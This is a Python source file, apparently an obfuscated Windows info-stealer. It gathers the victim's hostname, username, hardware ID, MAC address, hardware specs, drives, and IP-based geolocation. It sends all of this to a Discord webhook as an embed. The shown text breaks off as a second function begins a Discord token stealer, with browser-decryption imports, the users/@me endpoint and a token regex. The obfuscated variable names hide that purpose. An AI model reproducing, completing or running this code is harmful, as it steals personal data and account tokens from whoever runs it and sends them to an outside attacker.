RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ    = RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(WYHMMDEBGDDHQVAUGIOHZLCWVSFMBQAMUQFKRSMSLVSDEHCSYQWMSPBBIXDKNTMASVWWMKXUROVJKCSNIQRSTNPKANHWD, FEZBJSDIYFKCAARDAQOYXUYFOUFLRCJTBISQQDJIKMWLSBKLZJASJOSRNXWTZSUCJ)

NARTOHZGIKYCKBLOQCFKIFENPGPWADUUAQXCNMTFRZGOBBDYSBZBMPYTNPYHGUUKFASRATPBHNHZYBGUKQVDDRQYLXVTDQK         = os.getenv("WINDIR", None).replace(" ", "%20")
ZFWEVREABKTEYWBXDFLXTMGTYXZJDXZZDFZHTKPKRIBCFVQXNCSEGMUTOFJWCUFMUUBSBNSSCTCZKZBILLEDUCMAHKSAGLZXWQ     = os.getenv('USERPROFILE', None).replace(" ", "%20")
XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    RVQVTJNBMEXNBPFGUFSWIYUMRHDYSVFBCEGPYPRRVWGXMQLNOGRSTANMAXYOJOYOHHQIJAOUVJZBV = requests.get(f"https://{GGYBSNCVBTUYBNDFDGHQMRYTVCTGXVEAYKTUIZXFRWWKKWMHQWAQKTSJKFMAADATTKAEF}/api/ip/ip={EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}")
    RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW = RVQVTJNBMEXNBPFGUFSWIYUMRHDYSVFBCEGPYPRRVWGXMQLNOGRSTANMAXYOJOYOHHQIJAOUVJZBV.json()

    MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('country', "None")
    MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI_code = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('country_code', "None")
    SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('region', "None")
    SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR_code = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('region_code', "None")
    GACYGCUSMIDCHTLRIHKRXIKCVYPULALAKNOCTNBNPBDVVGELJGVFIKXIDODPL = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('zip', "None")
    EFVVFHSSXDQPHWDTKHRZTCWWPJHKTDGBCMEEZVHBCWVNREGZXACCABPEYSCMDZVBAPJL = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('city', "None")
    FDNWCUUFKVWRHJLUJIMOBUYGHVTYMVFKPILAXDOZIPUVCZWBWDCOGKNKBR = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('latitude', "None")
    SGBDGBBUALWEWZDOZPZVKEHJXIKCAGRDQELDDQAMXMGQWEEUTXKNLMMWMHXRVVSSIQAGKHDJIHBHKBJNOV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('longitude', "None")
    XNPWPNSVWDMIRRKGLQCSQMDPKZBROATLCBMZQRCYZJKVZJDKLQFEJPYONBHLCQOHBLVQQIITXERGOXUZFZZQCPYABFIBK = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('timezone', "None")
    DPVOJKGDUBAXJEQAOTPGMLZCWXJJUKYMCMPZDODXACOGGPPAXBSLDUQPQAQSIVV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('isp', "None")
    EQFKFDYXGTYGHZOFCFBHEOSLEZWGZPRQITPDGHHYJLTMHACBFUWWIQTUXDDDNCDHV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('org', "None")
    HGNXCKHAJJWXEKMDJUTVPEEAFIQFTSPGTNBXZKXNYAWGFOFDDNSKQUPUMQMSMRNVOYOTAWQAVEPPDVJXNIAKKETOLYJB = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('as', "None")
except:
    RVQVTJNBMEXNBPFGUFSWIYUMRHDYSVFBCEGPYPRRVWGXMQLNOGRSTANMAXYOJOYOHHQIJAOUVJZBV = requests.get(f"http://ip-api.com/json/{EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}")
    RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW = RVQVTJNBMEXNBPFGUFSWIYUMRHDYSVFBCEGPYPRRVWGXMQLNOGRSTANMAXYOJOYOHHQIJAOUVJZBV.json()

    MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('country', "None")
    MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI_code = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('countryCode', "None")
    SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('regionName', "None")
    SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR_code = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('region', "None")
    GACYGCUSMIDCHTLRIHKRXIKCVYPULALAKNOCTNBNPBDVVGELJGVFIKXIDODPL = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('zip', "None")
    EFVVFHSSXDQPHWDTKHRZTCWWPJHKTDGBCMEEZVHBCWVNREGZXACCABPEYSCMDZVBAPJL = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('city', "None")
    FDNWCUUFKVWRHJLUJIMOBUYGHVTYMVFKPILAXDOZIPUVCZWBWDCOGKNKBR = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('lat', "None")
    SGBDGBBUALWEWZDOZPZVKEHJXIKCAGRDQELDDQAMXMGQWEEUTXKNLMMWMHXRVVSSIQAGKHDJIHBHKBJNOV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('lon', "None")
    XNPWPNSVWDMIRRKGLQCSQMDPKZBROATLCBMZQRCYZJKVZJDKLQFEJPYONBHLCQOHBLVQQIITXERGOXUZFZZQCPYABFIBK = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('timezone', "None")
    DPVOJKGDUBAXJEQAOTPGMLZCWXJJUKYMCMPZDODXACOGGPPAXBSLDUQPQAQSIVV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('isp', "None")
    EQFKFDYXGTYGHZOFCFBHEOSLEZWGZPRQITPDGHHYJLTMHACBFUWWIQTUXDDDNCDHV = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('org', "None")
    HGNXCKHAJJWXEKMDJUTVPEEAFIQFTSPGTNBXZKXNYAWGFOFDDNSKQUPUMQMSMRNVOYOTAWQAVEPPDVJXNIAKKETOLYJB = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('as', "None")

def JBNHKYJEHJFMMGOWCLFCOVBKTTCOFRFVOYNGQOSCUCKIVVLMWJFNMIMOIKCTTBGCTNAMVBJRNNJWULMT():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: ZOLZPVVKTZXHBYNFARSIOLRKPNTXFMHUYSCGEDENIXQBEDSRPAECBNGRD = {platform.system()}
    except: ZOLZPVVKTZXHBYNFARSIOLRKPNTXFMHUYSCGEDENIXQBEDSRPAECBNGRD = "None"

    try: TYLFECOTRNNHJPZOICQEQAZULIEIQBLXCWMDICNNPECXZZCHDGJKRTEAI = platform.version()
    except: TYLFECOTRNNHJPZOICQEQAZULIEIQBLXCWMDICNNPECXZZCHDGJKRTEAI = "None"

    try: XKBJASNICYOSDPKOWEGCJOHUDONLEGLDVNMGNZSLLMEOPBQPDTHUYFVBWPDVVSQLSJLKN = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: XKBJASNICYOSDPKOWEGCJOHUDONLEGLDVNMGNZSLLMEOPBQPDTHUYFVBWPDVVSQLSJLKN = "None"

    try: VBXDAOVLTSNTYKJMMDIFMFDHWHVFHZVBWGTFHEARLCRDSZAPYISADCAEMAOBFTKGGOXVYNVKTRCDYXDTTPNGMTHPV = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: VBXDAOVLTSNTYKJMMDIFMFDHWHVFHZVBWGTFHEARLCRDSZAPYISADCAEMAOBFTKGGOXVYNVKTRCDYXDTTPNGMTHPV = "None"

    try: ZFPTTEAZFSNLBVITLLMKBLWQTXFRUFPZAXSATDSKLXLCUYFDBCEXAOMEOENNKLIZLV = round(psutil.virtual_memory().total / (1024**3), 2)
    except: ZFPTTEAZFSNLBVITLLMKBLWQTXFRUFPZAXSATDSKLXLCUYFDBCEXAOMEOENNKLIZLV = "None"

    try: JRIDCUMKKKQYVHZRELDOPTSTONRMWHIXKQIAQIGFYEIWWHULUVRMOWFHGSZNAVLYFGNMJBYRC = platform.processor()
    except: JRIDCUMKKKQYVHZRELDOPTSTONRMWHIXKQIAQIGFYEIWWHULUVRMOWFHGSZNAVLYFGNMJBYRC = "None"

    try: XXPXTZYGNDZDSJLUEANDSVXYQLLXBXCXBFVJZMCWFNDKBLMVQP = psutil.cpu_count(logical=False)
    except: XXPXTZYGNDZDSJLUEANDSVXYQLLXBXCXBFVJZMCWFNDKBLMVQP = "None"

    try: NICXCLMIKVDBXOLHLEDKYCWTTYDSVXTWEKNVQGIWIXAEMXGJZRERGOIYORGMAQABJYOLE = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: NICXCLMIKVDBXOLHLEDKYCWTTYDSVXTWEKNVQGIWIXAEMXGJZRERGOIYORGMAQABJYOLE = "None"

    try:
        VOTXXTSGLVKIOEPKOVMNYKEGSRMJNRMUNKSQTJUHXKCMCQRXEBUSXZNCQWWTXFURTMMTSGENTXNXZVFFBSLA = []
        BDNJZQUTRBACHXCRJLNBWJLKEVNGSORKHGCZFASDJFGOLYXZCZEYJPSKL = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if BDNJZQUTRBACHXCRJLNBWJLKEVNGSORKHGCZFASDJFGOLYXZCZEYJPSKL & 1:
                HVCVVKLELTBEBVGZZWDDIALRPSVAFNGCHHKOTDXRCDENDMESGZCTOSBBHXPOKTTSGYAACETIBZOMOWPOZGULPYBROQYFEW = v4r_letter + ":\\"
                try:
                    FALNUWJPFXLOPMUXGTNKAQAVZVADKZSDBLMWQLBBDHUFVXOEPBLOMEAFNDJFHRLTIEJSBHCNCRYTBWVQJXOQW = ctypes.c_ulonglong(0)
                    EQUPMGVBOKHIGILDFSKYDMKOCKFXOKGDCAZNDPTGHCKTGCZIPNQQDVTWQPIAKAEIMEZXKEIHXBALPXIQYSNMUQTIGCWPYVUWM = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(HVCVVKLELTBEBVGZZWDDIALRPSVAFNGCHHKOTDXRCDENDMESGZCTOSBBHXPOKTTSGYAACETIBZOMOWPOZGULPYBROQYFEW), None, ctypes.pointer(EQUPMGVBOKHIGILDFSKYDMKOCKFXOKGDCAZNDPTGHCKTGCZIPNQQDVTWQPIAKAEIMEZXKEIHXBALPXIQYSNMUQTIGCWPYVUWM), ctypes.pointer(FALNUWJPFXLOPMUXGTNKAQAVZVADKZSDBLMWQLBBDHUFVXOEPBLOMEAFNDJFHRLTIEJSBHCNCRYTBWVQJXOQW))
                    TLGENUPSSXQOIDYZFSOOQZRQNEOHIJAWGZDVFOJOFZNFMFDNVPOHYSTKPEHPOZIJCYKJMSOSNPBHEJDGBXPXFAFAJX = EQUPMGVBOKHIGILDFSKYDMKOCKFXOKGDCAZNDPTGHCKTGCZIPNQQDVTWQPIAKAEIMEZXKEIHXBALPXIQYSNMUQTIGCWPYVUWM.value
                    SQPASOPQDFGREGHESMTSWULWOTANKEGOCKTZDNRWRANKIQLWRRKWQZTOEYPQLF = FALNUWJPFXLOPMUXGTNKAQAVZVADKZSDBLMWQLBBDHUFVXOEPBLOMEAFNDJFHRLTIEJSBHCNCRYTBWVQJXOQW.value
                    DKZDPYXGSTMTJFTSBBGVSUVNXEKZDBXYINZOEXIRTEIFMUOSYUQMSTNJHMCKETMAULLYYATWWFTMDKEHIGQGNXMXUU = TLGENUPSSXQOIDYZFSOOQZRQNEOHIJAWGZDVFOJOFZNFMFDNVPOHYSTKPEHPOZIJCYKJMSOSNPBHEJDGBXPXFAFAJX - SQPASOPQDFGREGHESMTSWULWOTANKEGOCKTZDNRWRANKIQLWRRKWQZTOEYPQLF
                    BISZLIGTKJPEHKQNQIQCBNNYTQEJVFGHPUCASUSDSCEOLNLYUPRWLNPGOVXZKBUQQYSHTKNMYXBZQZLKBDHUEAY = win32api.GetVolumeInformation(HVCVVKLELTBEBVGZZWDDIALRPSVAFNGCHHKOTDXRCDENDMESGZCTOSBBHXPOKTTSGYAACETIBZOMOWPOZGULPYBROQYFEW)[0]
                    drive = {
                        'drive': HVCVVKLELTBEBVGZZWDDIALRPSVAFNGCHHKOTDXRCDENDMESGZCTOSBBHXPOKTTSGYAACETIBZOMOWPOZGULPYBROQYFEW,
                        'total': TLGENUPSSXQOIDYZFSOOQZRQNEOHIJAWGZDVFOJOFZNFMFDNVPOHYSTKPEHPOZIJCYKJMSOSNPBHEJDGBXPXFAFAJX,
                        'free': SQPASOPQDFGREGHESMTSWULWOTANKEGOCKTZDNRWRANKIQLWRRKWQZTOEYPQLF,
                        'used': DKZDPYXGSTMTJFTSBBGVSUVNXEKZDBXYINZOEXIRTEIFMUOSYUQMSTNJHMCKETMAULLYYATWWFTMDKEHIGQGNXMXUU,
                        'name': BISZLIGTKJPEHKQNQIQCBNNYTQEJVFGHPUCASUSDSCEOLNLYUPRWLNPGOVXZKBUQQYSHTKNMYXBZQZLKBDHUEAY,
                    }
                    VOTXXTSGLVKIOEPKOVMNYKEGSRMJNRMUNKSQTJUHXKCMCQRXEBUSXZNCQWWTXFURTMMTSGENTXNXZVFFBSLA.append(drive)
                except:
                    ()
            BDNJZQUTRBACHXCRJLNBWJLKEVNGSORKHGCZFASDJFGOLYXZCZEYJPSKL >>= 1

        LQLCPPYQYUCZLDOMUSBNOTNQHTPGBXSHGBAIJAHTTMRCLHLXSUBFPIOZUKAGCTYFCCEPXWRWVDVHFPVPZ = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in VOTXXTSGLVKIOEPKOVMNYKEGSRMJNRMUNKSQTJUHXKCMCQRXEBUSXZNCQWWTXFURTMMTSGENTXNXZVFFBSLA:
            BFXDRKVQWAJMWLQVCAEIQKYDNNPZEJIEISWQQXROLMRXGSQUILIRXOWCTLELZGMLFLQDSUEULVLUEBZAKDWGAKDZFHCZ = (v4r_drive['used'] / v4r_drive['total']) * 100
            SQPASOPQDFGREGHESMTSWULWOTANKEGOCKTZDNRWRANKIQLWRRKWQZTOEYPQLF_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            TLGENUPSSXQOIDYZFSOOQZRQNEOHIJAWGZDVFOJOFZNFMFDNVPOHYSTKPEHPOZIJCYKJMSOSNPBHEJDGBXPXFAFAJX_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            BFXDRKVQWAJMWLQVCAEIQKYDNNPZEJIEISWQQXROLMRXGSQUILIRXOWCTLELZGMLFLQDSUEULVLUEBZAKDWGAKDZFHCZ_str = "{:.2f}%".format(BFXDRKVQWAJMWLQVCAEIQKYDNNPZEJIEISWQQXROLMRXGSQUILIRXOWCTLELZGMLFLQDSUEULVLUEBZAKDWGAKDZFHCZ)
            LQLCPPYQYUCZLDOMUSBNOTNQHTPGBXSHGBAIJAHTTMRCLHLXSUBFPIOZUKAGCTYFCCEPXWRWVDVHFPVPZ += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   SQPASOPQDFGREGHESMTSWULWOTANKEGOCKTZDNRWRANKIQLWRRKWQZTOEYPQLF_gb,
                                                                   TLGENUPSSXQOIDYZFSOOQZRQNEOHIJAWGZDVFOJOFZNFMFDNVPOHYSTKPEHPOZIJCYKJMSOSNPBHEJDGBXPXFAFAJX_gb,
                                                                   BFXDRKVQWAJMWLQVCAEIQKYDNNPZEJIEISWQQXROLMRXGSQUILIRXOWCTLELZGMLFLQDSUEULVLUEBZAKDWGAKDZFHCZ_str,
                                                                   v4r_drive['name'])
    except:
        LQLCPPYQYUCZLDOMUSBNOTNQHTPGBXSHGBAIJAHTTMRCLHLXSUBFPIOZUKAGCTYFCCEPXWRWVDVHFPVPZ = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            IJRZXKFXZWAUXRPETUHHIKEIECXQKBTRXLTCXBJZKRVRZSOZWFGNXVJNHOORZYXFJJDEIFUTUKRJKRTDWPTSVGSOWIWKCJGAAUFB = 'Pc Portable'
        else:
            IJRZXKFXZWAUXRPETUHHIKEIECXQKBTRXLTCXBJZKRVRZSOZWFGNXVJNHOORZYXFJJDEIFUTUKRJKRTDWPTSVGSOWIWKCJGAAUFB = 'Pc Fixed'
    except:
        IJRZXKFXZWAUXRPETUHHIKEIECXQKBTRXLTCXBJZKRVRZSOZWFGNXVJNHOORZYXFJJDEIFUTUKRJKRTDWPTSVGSOWIWKCJGAAUFB = "None"

    try: PANBAQVIEMFBEFTMZNMGRJHUHXRPOLMHUXKWMCEZBEQXYGRTPXEHFPJHJUCOUS = len(screeninfo.get_monitors())
    except: PANBAQVIEMFBEFTMZNMGRJHUHXRPOLMHUXKWMCEZBEQXYGRTPXEHFPJHJUCOUS = "None"

    embed = Embed(title=f'System Info {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {BQABHNEQSCJXQWTORKKOOFXCXUWNUBQAVWGUDDIGSXDAWMEIHWHMLQAADGNBAPXZFKQTMLRVJK}
Username    : {XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}
DisplayName : {PBHDZKEIQVGPXEELEIRFFETTMPYQUMYWQDYIHHNNGSXHHEWRCSAQBJQJDNGWO}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {IJRZXKFXZWAUXRPETUHHIKEIECXQKBTRXLTCXBJZKRVRZSOZWFGNXVJNHOORZYXFJJDEIFUTUKRJKRTDWPTSVGSOWIWKCJGAAUFB}
Exploitation  : {ZOLZPVVKTZXHBYNFARSIOLRKPNTXFMHUYSCGEDENIXQBEDSRPAECBNGRD} {TYLFECOTRNNHJPZOICQEQAZULIEIQBLXCWMDICNNPECXZZCHDGJKRTEAI}
Screen Number : {PANBAQVIEMFBEFTMZNMGRJHUHXRPOLMHUXKWMCEZBEQXYGRTPXEHFPJHJUCOUS}

HWID : {VBXDAOVLTSNTYKJMMDIFMFDHWHVFHZVBWGTFHEARLCRDSZAPYISADCAEMAOBFTKGGOXVYNVKTRCDYXDTTPNGMTHPV}
MAC  : {XKBJASNICYOSDPKOWEGCJOHUDONLEGLDVNMGNZSLLMEOPBQPDTHUYFVBWPDVVSQLSJLKN}
CPU  : {JRIDCUMKKKQYVHZRELDOPTSTONRMWHIXKQIAQIGFYEIWWHULUVRMOWFHGSZNAVLYFGNMJBYRC}, {XXPXTZYGNDZDSJLUEANDSVXYQLLXBXCXBFVJZMCWFNDKBLMVQP} Core
GPU  : {NICXCLMIKVDBXOLHLEDKYCWTTYDSVXTWEKNVQGIWIXAEMXGJZRERGOIYORGMAQABJYOLE}
RAM  : {ZFPTTEAZFSNLBVITLLMKBLWQTXFRUFPZAXSATDSKLXLCUYFDBCEXAOMEOENNKLIZLV}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}
Local  : {SMXNGOXXFPOCNEVSVQOWBJLOEYNURFTFSAYFGQJNZUYNQJQHDIQJBWHHKTHWYXXFCMEFLIVZIEFJGTJ}
Isp    : {DPVOJKGDUBAXJEQAOTPGMLZCWXJJUKYMCMPZDODXACOGGPPAXBSLDUQPQAQSIVV}
Org    : {EQFKFDYXGTYGHZOFCFBHEOSLEZWGZPRQITPDGHHYJLTMHACBFUWWIQTUXDDDNCDHV}
As     : {HGNXCKHAJJWXEKMDJUTVPEEAFIQFTSPGTNBXZKXNYAWGFOFDDNSKQUPUMQMSMRNVOYOTAWQAVEPPDVJXNIAKKETOLYJB}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{LQLCPPYQYUCZLDOMUSBNOTNQHTPGBXSHGBAIJAHTTMRCLHLXSUBFPIOZUKAGCTYFCCEPXWRWVDVHFPVPZ}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI} ({MENZCDJMEIDOQKKKNQSFNUCKFZBTNZLAYRVDYRTPKLKUBVIPMIOHOIZJKIPTHHBOLPTMLCRCQPECCCLHTI_code})
Region    : {SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR} ({SXRYFGJEDCJBXVAKIWHXEEHRQUXREZCKHICYJHTORPLRKOIVEWAQLSLBITSR_code})
Zip       : {GACYGCUSMIDCHTLRIHKRXIKCVYPULALAKNOCTNBNPBDVVGELJGVFIKXIDODPL}
City      : {EFVVFHSSXDQPHWDTKHRZTCWWPJHKTDGBCMEEZVHBCWVNREGZXACCABPEYSCMDZVBAPJL}
Timezone  : {XNPWPNSVWDMIRRKGLQCSQMDPKZBROATLCBMZQRCYZJKVZJDKLQFEJPYONBHLCQOHBLVQQIITXERGOXUZFZZQCPYABFIBK}
Latitude  : {FDNWCUUFKVWRHJLUJIMOBUYGHVTYMVFKPILAXDOZIPUVCZWBWDCOGKNKBR}
Longitude : {SGBDGBBUALWEWZDOZPZVKEHJXIKCAGRDQELDDQAMXMGQWEEUTXKNLMMWMHXRVVSSIQAGKHDJIHBHKBJNOV}```""", inline=False)


    embed.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)

    CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)
    CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(embed=embed, username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)

def YEOXYOURZOAJVNUCKGSSOPWNWJABPCIDUGLGQJGQBZWRLSTCLEEFXVKRCGEAYTNFHQU():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def SOGKZURQNCIHTLVYXLJMYTLYRJVEPXZDTBUMYLXFZFWPWRMSDBVZOFMDEK():
        OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV = "https://discord.com/api/v9/users/@me"
        CMBYHNRGIPECEQDFXUMBNSZIZRKKTWDYUBLOEUOFPPYKMZYESEPRGQAOIZVVBRIIKKBCWWNFMQRCCMCAJTYETMHL = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
